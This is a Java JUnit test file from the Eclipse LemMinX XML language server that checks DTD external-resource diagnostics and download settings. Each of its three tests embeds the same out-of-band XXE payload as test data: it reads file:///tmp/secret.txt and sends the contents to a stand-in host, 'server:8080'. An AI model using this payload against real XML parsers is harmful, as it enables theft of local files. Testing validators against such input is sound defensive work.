/**
 *  Copyright (c) 2022 Angelo ZERR
 *  All rights reserved. This program and the accompanying materials
 *  are made available under the terms of the Eclipse Public License v2.0
 *  which accompanies this distribution, and is available at
 *  http://www.eclipse.org/legal/epl-v20.html
 *
 * SPDX-License-Identifier: EPL-2.0
 *
 *  Contributors:
 *  Angelo Zerr <angelo.zerr@gmail.com> - initial API and implementation
 */
package org.eclipse.lemminx.extensions.dtd;

import static org.eclipse.lemminx.XMLAssert.ca;
import static org.eclipse.lemminx.XMLAssert.pd;
import static org.eclipse.lemminx.XMLAssert.r;
import static org.eclipse.lemminx.XMLAssert.testCodeActionsFor;

import org.eclipse.lemminx.AbstractCacheBasedTest;
import org.eclipse.lemminx.XMLAssert;
import org.eclipse.lemminx.extensions.contentmodel.model.ContentModelManager;
import org.eclipse.lemminx.extensions.contentmodel.participants.DTDErrorCode;
import org.eclipse.lemminx.extensions.contentmodel.participants.ExternalResourceErrorCode;
import org.eclipse.lemminx.extensions.contentmodel.participants.codeactions.DownloadDisabledResourceCodeAction;
import org.eclipse.lemminx.extensions.contentmodel.settings.ContentModelSettings;
import org.eclipse.lemminx.extensions.contentmodel.settings.XMLValidationRootSettings;
import org.eclipse.lemminx.services.XMLLanguageService;
import org.eclipse.lemminx.uriresolver.CacheResourcesManager;
import org.eclipse.lsp4j.Diagnostic;
import org.eclipse.lsp4j.DiagnosticSeverity;
import org.junit.jupiter.api.Test;

/**
 * DTD file diagnostics.
 *
 */
public class DTDValidationExternalResourcesTest extends AbstractCacheBasedTest {

	@Test
	public void entityRefInvalidUri() throws Exception {

		XMLValidationRootSettings validation = new XMLValidationRootSettings();
		validation.setResolveExternalEntities(true);

		XMLLanguageService ls = new XMLLanguageService();

		String dtd = "<!ENTITY % file SYSTEM \"file:///tmp/secret.txt\">\r\n" + //
				"	<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://<server>:8080/dtd.xml?%file;'>\">\r\n" + //
				"	%eval;\r\n" + //
				"	%exfiltrate;";

		String fileURI = "test.dtd";
		// Downloading...
		XMLAssert.testPublishDiagnosticsFor(dtd, fileURI, validation, ls, pd(fileURI,
				new Diagnostic(r(0, 24, 0, 46), "Cannot find DTD 'file:///tmp/secret.txt'.", DiagnosticSeverity.Error,
						"xml", DTDErrorCode.DTDNotFound.getCode()),
				new Diagnostic(r(1, 53, 1, 82),
						"The 'http://<server>:8080/dtd.xml?' URI cannot be parsed: Illegal character in authority at index 7: http://<server>:8080/dtd.xml?",
						DiagnosticSeverity.Error, "xml", DTDErrorCode.DTDNotFound.getCode())));
	}

	@Test
	public void entityRefDownloadDisabled() throws Exception {

		XMLValidationRootSettings validation = new XMLValidationRootSettings();
		validation.setResolveExternalEntities(true);

		XMLLanguageService ls = new XMLLanguageService();
		ls.initializeIfNeeded();
		// Disable download
		ContentModelManager contentModelManager = ls.getComponent(ContentModelManager.class);
		contentModelManager.setDownloadExternalResources(false);

		String dtd = "<!ENTITY % file SYSTEM \"file:///tmp/secret.txt\">\r\n" + //
				"	<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://server:8080/dtd.xml?%file;'>\">\r\n" + //
				"	%eval;\r\n" + //
				"	%exfiltrate;";

		String fileURI = "test.dtd";
		// Downloading...
		Diagnostic d = new Diagnostic(r(1, 53, 1, 80), "Downloading external resources is disabled.",
				DiagnosticSeverity.Error, "xml", ExternalResourceErrorCode.DownloadResourceDisabled.getCode());

		// Test diagnostics
		XMLAssert.testPublishDiagnosticsFor(dtd, fileURI, validation, ls,
				pd(fileURI, new Diagnostic(r(0, 24, 0, 46), "Cannot find DTD 'file:///tmp/secret.txt'.",
						DiagnosticSeverity.Error, "xml", DTDErrorCode.DTDNotFound.getCode()), d));

		// Test code action
		testCodeActionsFor(dtd, fileURI, d, //
				ca(d, DownloadDisabledResourceCodeAction.createDownloadCommand(
						"Force download of 'http://server:8080/dtd.xml?'.", "http://server:8080/dtd.xml?", fileURI)));
	}

	@Test
	public void entityRefDownloadProblem() throws Exception {

		XMLValidationRootSettings validation = new XMLValidationRootSettings();
		validation.setResolveExternalEntities(true);

		XMLLanguageService ls = new XMLLanguageService();

		String dtd = "<!ENTITY % file SYSTEM \"file:///tmp/secret.txt\">\r\n" + //
				"	<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://server:8080/dtd.xml?%file;'>\">\r\n" + //
				"	%eval;\r\n" + //
				"	%exfiltrate;";

		String dtdCachePath = CacheResourcesManager.getResourceCachePath("http://server:8080/dtd.xml").toString();
		String fileURI = "test.dtd";
		// Downloading...
		XMLAssert.testPublishDiagnosticsFor(dtd, fileURI, validation, ls,
				pd(fileURI,
						new Diagnostic(r(0, 24, 0, 46), "Cannot find DTD 'file:///tmp/secret.txt'.",
								DiagnosticSeverity.Error, "xml", DTDErrorCode.DTDNotFound.getCode()),
						new Diagnostic(r(1, 53, 1, 80),
								"The resource 'http://server:8080/dtd.xml?' is downloading in the cache path '"
										+ dtdCachePath + "'.",
								DiagnosticSeverity.Information, "xml",
								ExternalResourceErrorCode.DownloadingResource.getCode())));

		XMLAssert.awaitDownloads(ls, dtd, fileURI, validation);

		// Downloaded error
		XMLAssert.testPublishDiagnosticsFor(dtd, fileURI, validation, ls,
				pd(fileURI,
						new Diagnostic(r(0, 24, 0, 46), "Cannot find DTD 'file:///tmp/secret.txt'.",
								DiagnosticSeverity.Error, "xml", DTDErrorCode.DTDNotFound.getCode()),
						new Diagnostic(r(1, 53, 1, 80),
								"Error while downloading 'http://server:8080/dtd.xml?' to '" + dtdCachePath
										+ "' : '[java.net.UnknownHostException] server'.",
								DiagnosticSeverity.Error, "xml", ExternalResourceErrorCode.DownloadProblem.getCode())));

	}

	public static void testDiagnosticsFor(String xml, String fileURI, Diagnostic... expected) {
		XMLAssert.testDiagnosticsFor(xml, null, null, fileURI, true, expected);
	}

	public static void testDiagnosticsFor(String xml, String fileURI, ContentModelSettings settings,
			Diagnostic... expected) {
		XMLAssert.testDiagnosticsFor(xml, null, null, fileURI, true, settings, expected);
	}

	public static void testDiagnosticsFor(XMLLanguageService ls, String xml, String fileURI,
			ContentModelSettings settings, Diagnostic... expected) {
		XMLAssert.testDiagnosticsFor(ls, xml, null, null, fileURI, true, settings, expected);
	}
}
